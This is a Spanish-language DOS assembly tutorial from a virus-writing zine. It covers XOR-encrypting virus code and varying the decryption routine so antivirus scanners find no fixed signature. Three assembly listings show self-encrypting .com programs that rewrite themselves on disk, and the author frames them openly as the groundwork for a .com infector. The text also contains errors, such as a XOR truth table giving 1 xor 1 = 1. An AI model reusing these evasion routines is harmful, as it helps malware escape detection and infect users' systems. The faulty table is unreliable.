@@ -1,0 +1,552 @@
+Encripci¢n, parte 1...
+-------------------------------------------------------------------------------
+Algunas definiciones
+--------------------
+Criptografia: del griego          graphe----->accion de escribir
+              y de                kruptos---->oculto  
+
+ Arte de escribir con clave secreta o de modo enigmatico.
+
+Que es encriptar.
+-----------------
+Encriptar ( en nuestro metie ) consiste en codificar o cambiar un codigo
+perfectamente legible por otro que a primera instancia no lo sea.
+
+Para que encriptamos un codigo.
+-------------------------------
+
+a)Para que no sea legible el codigo a simple vista al hacer un desensamblado.
+b)Para que algunos antivirus heuristicos no nos jodan.
+c)Para que en cada encriptacion si es posible sea distinta , de tal manera que
+  en cada reproduccion el codigo sea distinto y no se encuentre una cadena
+  fija permanente que pueda ser usada por los scaner.(Realizar esto implicaria
+  una mezcla de encriptacion con mutacion-)
+d)En definitiva para camuflear el codigo.
+e)Para lo que se les ocurra.
+
+Formato general de un programa que use encriptamiento.
+------------------------------------------------------
+
+startprog:         CALL desencripar
+;******************************************************************
+;parte del codigo que queremos encriptar
+
+mark:               ...
+                    ...
+endmark:            ...
+
+;******************************************************************
+;rutina de desencriptacion
+
+desencriptar proc
+                   ...
+                   ...
+                   ...
+desencriptar endp
+
+                    
+De el bosquejo anterior usted puede empezar a razonar lo siguiente..
+
+a)La cabezera o sea ------>call desencriptar , permanecera inmutable por
+ mas que la rutina de encriptacion en cada reproduccion codifique de forma
+ diferente la porcion de codigo comprendida entre las etiquetas mark y
+ endmark.
+
+b)La rutina de desencriptacion nunca sera encriptada y por lo tanto le cabe
+ las mismas consideraciones expuestas en a).
+ Dado que la longitud de esta rutina es larga , mas facil es encontrar una
+ cadena que se pueda usar para identificar al virus.
+ 
+c)De lo anterior se deduce que la rutina de desencriptacion debe ser de la
+  menor longitud posible , o mejor distinta en cada reproduccion.
+
+d)La rutina de encriptacion , esta encriptada---->Redundancia??
+ 
+
+Como se encripta.
+-----------------
+El virus se debe encriptar justamente antes de reproducirce.
+Las rutinas de encriptacion basicas generalmente operan sobre los bytes del
+codigo realizando operaciones logicas o aritmeticas sobre estos.
+
+Utilizando xor.
+~~~~~~~~~~~~~~~
+  
+La intrucion xor destino,fuente realiza un or exclusivo entre destino y fuente
+y el resultado queda en destino.
+
+destino    xor    fuente         destino
+  0                 0              0
+  0                 1              1
+  1                 0              1
+  1                 1              1
+
+Lo divertido de la intruccion xor es que si realizamos dos veces la instruccion
+xor con el mismo valor obtenemos el dato original.
+
+EJEMPLO.
+~~~~~~~    mov cl,55h
+           mov bl,0aah----------->registro bl=AA en hexa.
+           xor bl,cl ------------> bl xor cl ---->bl=FF en hexa.
+
+           xor bl,cl-------------> bl xor cl ---->bl=AA en hexa.
+
+Esto es ideal para encriptar ya que la rutina de encriptacion y la de
+desencriptacion sera identica.
+
+A modo de ejemplo utilizaremos un programa .com  que cada vez que se ejecuta se
+sobrescribe sobre si mismo encriptandoce.
+ 
+Paso a Paso.
+------------
+1) Programa sin encriptacion.
+;________________________cortar aqui_________________________________
+;compilarlo con nombre prueba1.com
+
+code segment
+              org 0100h
+              assume cs:code,ds:code
+programa      proc far
+uno:
+              lea dx, saludo
+              mov ah,09h
+              int 21h                    ;imprime Minotauro
+        
+              mov ax,3d02h               ;habre el file prueba1.com
+              lea dx,file                ;modo lectura escritura
+              int 21h                    ;debuelve file handle en ax
+              mov (handle), ax
+
+              mov bx, (handle)
+              lea cx,dos                 ;calcula y guarda en cx la
+              lea ax,uno                 ;longitud en bytes de este programa
+              sub cx,ax
+            
+              lea dx,uno                 ;buffer comienza en ds:uno 
+            
+              mov ax,4000h
+              int 21h                    ;se sobreescribe este programa
+            
+              mov ax,3e00h               ;cierra el file prueba1.com
+              int 21h
+
+              mov ah,4ch                 ;vuelve al dos
+              int 21h
+
+saludo   db  "Minotauro$"
+file     db  "prueba1.com",0
+handle   dw  1 dup (?)   
+dos:
+programa endp
+code ends
+end           programa
+;__________________________cortar aqui____________________________________
+
+Bien si usted a ejecutado el programa anterio vera que funciona correctamente.
+Pero ahora suponga que el programa anterior sea un codigo de un virus
+infector de .com no residente.
+Entonces seria facil para el anti extraer una firma ($%#@&*@-%##-->dedicado
+al anti),consistente en un string de bytes lo suficientemente extenso para
+ser utilizado por un scaner ya que el codigo permanece igual en cada corrida.
+Para evitar este inconveniente encriptaremos el programa anterior utilizando
+xor.
+ 
+
+2) Encriptado con xor.
+
+ Los pasos en el programa serian los siguientes:
+
+ a)Desencriptar con la llave existente
+ b)Se ejecuta el programa desencriptado
+ c)Generar una nueva llave
+ d)Encriptar y sobreescribirse
+ e)Devolver el control.
+ 
+La rutina de encriptacion y desencriptacion.
+--------------------------------------------
+nombre:encrEsta rutina es la encargada de encriptar y desencriptar , por lo tanto
+sera casi la unica parte que quedara siempre sin encriptar.
+Basicamente trabajara encriptando o desencriptando el codigo comprendido
+entre las etiquetas mark y endmark.
+Realizara una xor exclusive con una llave que se guarda en xorkey ,
+la cual es una variable tipo word.
+Prefiero hacer xor con word en vez de bytes debido a con el primero
+tendremos 65535 codificaciones del codigo distinto , contra 255 si usamos
+bytes.
+( Esto no es tan asi por el metodo con que se genera la llave)
+De ordinario la primera vez debera realizar un xor con llave igual a cero.
+Luego el programa genera una nueva llave , utilizando el servicio int 21,2c
+lectura de tiempo y fecha del dos.
+Esta nueva llave es guardada en la variable xorkey y se utilizara en el
+momento de encriptacion.
+De mas esta decir que la variable xorkey no es encriptada.
+
+UNA COSA MAS.
+-------------
+
+Debido  a que pretendemos codificar lo maximo posible el codigo ,
+la parte de copiado y devolucion del control al dos (o al anfitrion si estamos
+realizando un virus ) es copiada en memoria al final del virus ,esto
+debido a que si no hariamos esto esta parte tambien tendria que quedar sin
+codificar.
+Esto es la porcion de codigo comprendido entre l1 y l2.
+
+
+;___________________________cortar aqui____________________________________
+;compilarlo con nombre prueba2.com
+
+code segment
+              org 0100h
+              assume cs:code,ds:code
+programa      proc far
+uno:
+;*****************************************************************************
+;Esta parte en este programa no haria falta , esto es para allar el delta offset
+;para direccionar atravez de bp pues en un virus infector de com si este
+;se anexa al final las etiquetas quedarian mal direccionadas.
+
+              CALL falso
+falso proc
+falso endp
+              pop bp
+              sub bp,0103h
+;*****************************************************************************
+              call encr_desc
+mark:
+
+
+start:
+              lea dx, saludo + bp
+              mov ah,09h
+              int 21h                    ;imprime Minotauro
+
+;             etc....etc....etc
+
+;******************************************************************
+;mueve desde l1 hasta l2 al final del codigo
+;esta parte en un virus seria la parte de reproduccion y devolucion
+;del control al programa anfitrion
+;esto lo realizamos para tratar de encriptar la mayor parte posible de codigo.
+
+
+              cld
+              lea si, l1 + bp
+              lea di, dos + bp
+              lea cx, l2
+              lea ax, l1
+              sub cx,ax
+              sar cx, 1
+              inc cx
+              rep movsw
+
+;*******************************************************************
+              call rand        ;obtiene un numero aleatorio de 16 bits
+                               ;para usarlo como nueva llave
+              mov word ptr [xorkey+bp],dx
+;********************************************************************
+
+              jmp dos
+l1:
+;encuentra el offset en donde a quedado la rutina encr_desc
+;almacena en called para luego llamar a esta rutina via memoria.
+
+              lea ax, rutina + bp
+              mov [called + bp], ax
+      
+              mov ax,3d02h                  ;habre el file prueba1.com
+              lea dx,file+bp                ;modo lectura escritura
+              int 21h                       ;debuelve file handle en ax
+              mov [handle + bp], ax
+
+              mov bx, [handle + bp]
+              lea cx,dos+bp                 ;calcula y guarda en cx la
+              lea ax,uno+bp                 ;longitud en bytes de este programa
+              sub cx,ax
+            
+              lea dx,uno+bp              ;buffer comienza en ds:uno  
+            
+              push bx
+              push cx
+              push dx
+
+              call [called+bp]           ;encripta con la nueva llave
+            
+              pop dx
+              pop cx
+              pop bx
+
+              mov ax,4000h
+              int 21h                    ;se sobreescribe este programa
+
+            
+              mov ax,3e00h               ;cierra el file prueba1.com
+              int 21h
+
+              mov ah,4ch                 ;vuelve al dos
+              int 21h
+l2:
+
+;**********************************************************************
+rand proc
+;genera una nueva llave aleatoria leyendo el reloj (minutos y segundos)
+;resultado en dx    
+              mov ah,2ch
+              int 21h
+              ret
+rand endp
+;**********************************************************************
+
+saludo   db  "Minotauro$"
+file     db  "prueba2.com",0
+handle   dw   1 dup (?)
+
+endmark:      nop
+              nop
+;la encriptacion termina en endmark y debido a que trabajamos con word
+;y en el calculo nos puede dar que el ultimo word a encriptar comienze
+;en direccion de handle+1 ponemos un dos para que si sucede esto encripte
+;inutilmente al nop y no a la parte baja de xorkey la cual debe quedar
+;desencriptada.  
+;Se podria haber colocado endmark antes de handle y sacar los nop.  
+
+
+xorkey       dw 1 dup (0)                ;word donde se guarda la llave
+called       dw 1 dup (0)
+
+;********************rutina de encriptacion y desencriptacion*************
+rutina:
+;esta etiqueta (rutina) esta por el echo de que cuando llamamos a la
+;rutina para encriptar lo hacemos desde el codigo que hemos desplazado
+;en memoria y si hacemos un call encr;pues la rutina encr;calculado en tiempo de compilacion,
+;por lo tanto llamamos a la rutina via memoria y para saber
+;donde a quedado usamos la etiqueta rutina.
+
+encr_desc    proc
+             lea bx, mark + bp
+             lea dx, endmark + bp
+             mov cx, dx
+             sub cx,bx
+             sar cx, 1
+             inc cx
+             mov dx, [xorkey + bp]
+xorloop:     xor [bx],dx           ;bx puntero de word a criptar o descriptar
+             add bx,02             ;dx la llave
+             loop xorloop
+             ret
+encr_desc    endp
+;***************************************************************************
+dos:
+programa endp
+code ends
+end           programa
+;____________________________corte aqui__________________________________
+
+Bien ahora usted observa que en cada corrida del programa pocas son las
+partes del mismo que permanece constantes exactamente estas partes son:
+****************************************************************************
+              CALL falso
+falso proc
+falso endp
+              pop bp
+              sub bp,0103h
+
+Esta parte no nos traer problema en primera instancia ya que son pocos bytes.
+En todo caso podemos usar un truco que veremos luego.
+ 
+****************************************************************************
+
+xorkey       dw 1 dup (0)                ;word donde se guarda la llave
+called       dw 1 dup (0)
+
+No problema pues xorkey es distinta en cada reproduccion.
+
+****************************************************************************
+encr_desc    proc
+             lea bx, mark + bp
+             lea dx, endmark + bp
+             mov cx, dx
+             sub cx,bx
+             sar cx, 1
+             inc cx
+             mov dx,[xorkey + bp]
+xorloop:     xor [bx],dx           ;bx puntero de word a criptar o descriptar
+             add bx,02             ;dx la llave
+             loop xorloop
+             ret
+encr_desc    endp
+
+Esta seria la parte mas extensa de codigo que queda sin encriptar , y por lo
+tanto el eslabon mas debil del sistema .
+Para eliminar esto supongamos que aaaa ..... cccc sean numeros aleatorios
+de 16 bits generados de la misma manera que xorkey y transformamos nuestra
+rutina de la siguiente manera.
+
+encr_desc    proc
+             lea bx, mark + bp
+antiscan:
+             add bx,aaaa------>agregado
+             sub bx,aaaa------>agregado
+
+             lea dx, endmark + bp
+             mov cx, dx
+             sub cx,bx
+
+             add cx,bbbb ------>agregado
+             sub cx,bbbb ------>agregado
+
+             sar cx, 1
+             inc cx
+             mov dx, [xorkey + bp]
+xorloop:     xor [bx],dx           ;bx puntero de word a criptar o descriptar
+             add bx,02             ;dx la llave
+             
+             add bx,cccc------>agregado
+             sub bx,cccc------>agregado
+
+             loop xorloop
+             ret
+encr_desc    endp
+
+Observese que al sumar y al restar una misma cantidad el contenido del
+registro no cambia , pero si el codigo generado.
+Con esto logramos que el string que se pueda llegar a dejar constante en
+cada reproduccion sea de menor longitud.
+
+Como se haria esto .... simple antes de reproducir generariamos los numeros
+aaaa.....cccc y los colocariamos en la rutina.
+******************************************************************************
+Veamos el programa con esta modificacion.
+-----------------------------------------
+
+;____________________________corte aqui____________________________________
+;compilarlo con nombre prueba3.com
+
+code segment
+              org 0100h
+              assume cs:code,ds:code
+programa      proc far
+uno:
+              call falso
+falso         proc
+falso         endp     
+              pop bp
+              sub bp,0103h
+              call encr_desc
+mark:
+start:
+              lea dx, saludo + bp
+              mov ah,09h
+              int 21h                    ;imprime Minotauro
+;             etc....etc....etc
+              cld
+              lea si, l1 + bp
+              lea di, dos + bp
+              lea cx, l2
+              lea ax, l1
+              sub cx,ax
+              sar cx, 1
+              inc cx
+              rep movsw
+              call rand        ;obtiene un numero aleatorio de 16 bits
+                               ;para usarlo como nueva llave
+              mov word ptr [xorkey+bp],dx
+;********************************************************************
+;agregado para variar la rutina de encriptamiento
+
+              lea di,antiscan+bp        ;puntero en di
+              call rand                 ;alla aaaa
+              mov [di+bp+2],dx          ;coloca aaaaa
+              mov [di+bp+6],dx          ;coloca aaaa
+              call rand                 ;alla bbbb
+              mov [di+bp+18],dx         ;coloca bbbb
+              mov [di+bp+22],dx         ;coloca bbbb
+              call rand                 ;alla cccc
+              mov [di+bp+39],dx         ;coloca cccc
+              mov [di+bp+43],dx         ;coloca cccc
+
+
+
+              jmp dos
+l1: 
+              lea ax, rutina + bp
+              mov [called + bp], ax
+              mov ax,3d02h                  ;habre el file prueba1.com
+              lea dx,file+bp                ;modo lectura escritura
+              int 21h                       ;debuelve file handle en ax
+              mov [handle + bp], ax
+              mov bx, [handle + bp]
+              lea cx,dos+bp                 ;calcula y guarda en cx la
+              lea ax,uno+bp                 ;longitud en bytes de este programa
+              sub cx,ax
+              lea dx,uno+bp              ;buffer comienza en ds:uno   
+              push bx
+              push cx
+              push dx
+              call [called+bp]           ;encripta con la nueva llave
+              pop dx
+              pop cx
+              pop bx
+              mov ax,4000h
+              int 21h                    ;se sobreescribe este programa
+              mov ax,3e00h               ;cierra el file prueba1.com
+              int 21h
+              mov ah,4ch                 ;vuelve al dos
+              int 21h
+l2:
+rand proc
+              mov ah,2ch
+              int 21h
+              ret
+rand endp
+saludo   db  "Minotauro$"
+file     db  "prueba3.com",0
+handle   dw   1 dup (?)
+endmark:      nop
+              nop
+xorkey       dw 1 dup (0)                ;word donde se guarda la llave
+called       dw 1 dup (0)
+rutina:
+encr_desc    proc
+             lea bx,mark+bp
+antiscan:
+             add bx,1111h
+             sub bx,1111h
+             lea dx, endmark + bp
+             mov cx, dx
+             sub cx,bx
+             add cx,2222h
+             sub cx,2222h
+             sar cx, 1
+             inc cx
+             mov dx, [xorkey + bp]
+xorloop:     xor [bx],dx           ;bx puntero de word a criptar o descriptar
+             add bx,02             ;dx la llave
+             add bx,3333h
+             sub bx,3333h
+             loop xorloop
+             ret
+encr_desc    enp
+dos:
+programa endp
+code ends
+end           programa
+;_______________________corte aqui___________________________________
+
+
+Bien ahora la rutina encr_desc ligeramente  cambia entre reproducion y
+reproduccion.
+?es esto la solucion final?
+No pues aunque se la hemos complicado a los anti todavia una vez estudiado
+el codigo los scaners podran usar comodines .
+Eso si les costara mas trabajo he he he...
+Bueno por algo se desarrollo la mutacion !!!!!.
+Creo para el metodo de xor ya basta lo explicado.
+Como veran la rutina de encriptacion no debe por que ser igual a la 
+de desencriptacion solo basta con que la segunda desaga los cambios
+producidos por la primera.
+Por ejemplo se podra encriptar sumando un numero y desencriptar restando,
+o rotando x veces cada byte a la derecha y desencriptar rotando a la 
+izquierda, o etc , etc , o una mezcla de todos.
+Bueno por esta vez basta que les aproveche y dudas al bbs. 
+
+Bye:LAPIDARIO.
